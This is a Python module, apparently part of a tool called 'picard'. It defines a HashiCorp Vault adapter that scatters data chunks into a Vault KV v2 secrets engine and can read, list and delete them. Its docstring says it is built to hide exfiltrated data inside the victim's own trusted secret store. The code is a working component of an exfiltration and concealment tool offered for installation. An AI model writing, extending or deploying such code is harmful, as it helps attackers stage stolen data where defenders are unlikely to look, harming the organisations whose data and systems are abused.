"""HashiCorp Vault adapter — stores chunks in Vault KV secrets engine.

Hides exfiltrated data in the vault itself — the one place that's
supposed to be the trusted store. Uses KV v2 secrets engine.

Requires: pip install picard[vault]  (aiohttp)
"""

from __future__ import annotations

import uuid
from typing import Sequence

from picard.adapters.base import Adapter, AdapterProfile, StoredChunkRef
from picard.chunker import Chunk


class VaultAdapter(Adapter):
    """Scatter chunks into HashiCorp Vault KV secrets."""

    def __init__(
        self,
        token: str,
        *,
        address: str = "http://localhost:8200",
        mount_path: str = "secret",
        path_prefix: str = "picard",
        max_chunk_bytes: int = 1_048_576,
    ) -> None:
        self._address = address.rstrip("/")
        self._token = token
        self._mount = mount_path
        self._prefix = path_prefix
        self._max = max_chunk_bytes

    def profile(self) -> AdapterProfile:
        return AdapterProfile(
            name="vault",
            max_chunk_bytes=self._max,
            persistent=True,
            ordered=False,
            rate_limit_per_min=500,
        )

    def _headers(self) -> dict[str, str]:
        return {"X-Vault-Token": self._token, "Content-Type": "application/json"}

    def _data_url(self, key: str) -> str:
        return f"{self._address}/v1/{self._mount}/data/{self._prefix}/{key}"

    def _metadata_url(self, key: str) -> str:
        return f"{self._address}/v1/{self._mount}/metadata/{self._prefix}/{key}"

    async def write_chunk(self, encoded_chunk: str) -> StoredChunkRef:
        import aiohttp

        try:
            chunk = Chunk.decode(encoded_chunk)
            key = f"{chunk.manifest_id}-b{chunk.block_index}-c{chunk.chunk_index}"
        except ValueError:
            key = uuid.uuid4().hex

        url = self._data_url(key)
        payload = {"data": {"chunk": encoded_chunk}}

        async with aiohttp.ClientSession() as session:
            async with session.put(
                url, json=payload, headers=self._headers()
            ) as resp:
                resp.raise_for_status()

        location = f"vault://{self._mount}/{self._prefix}/{key}"
        return StoredChunkRef(adapter_name="vault", location=location)

    async def read_chunk(self, ref: StoredChunkRef) -> str:
        import aiohttp

        key = ref.location.rsplit("/", 1)[-1]
        url = self._data_url(key)

        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=self._headers()) as resp:
                resp.raise_for_status()
                body = await resp.json()

        return body["data"]["data"]["chunk"]

    async def delete_chunk(self, ref: StoredChunkRef) -> bool:
        import aiohttp

        key = ref.location.rsplit("/", 1)[-1]
        url = self._metadata_url(key)

        try:
            async with aiohttp.ClientSession() as session:
                async with session.delete(url, headers=self._headers()) as resp:
                    return resp.status in (200, 204)
        except Exception:
            return False

    async def list_chunks(self, manifest_id: str) -> Sequence[StoredChunkRef]:
        import aiohttp

        url = f"{self._address}/v1/{self._mount}/metadata/{self._prefix}/"
        params = {"list": "true"}

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url, params=params, headers=self._headers()
                ) as resp:
                    if resp.status != 200:
                        return []
                    body = await resp.json()

            keys = body.get("data", {}).get("keys", [])
            return [
                StoredChunkRef(
                    adapter_name="vault",
                    location=f"vault://{self._mount}/{self._prefix}/{k}",
                )
                for k in keys
                if k.startswith(manifest_id)
            ]
        except Exception:
            return []

    async def health_check(self) -> bool:
        import aiohttp

        url = f"{self._address}/v1/sys/health"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    return resp.status == 200
        except Exception:
            return False
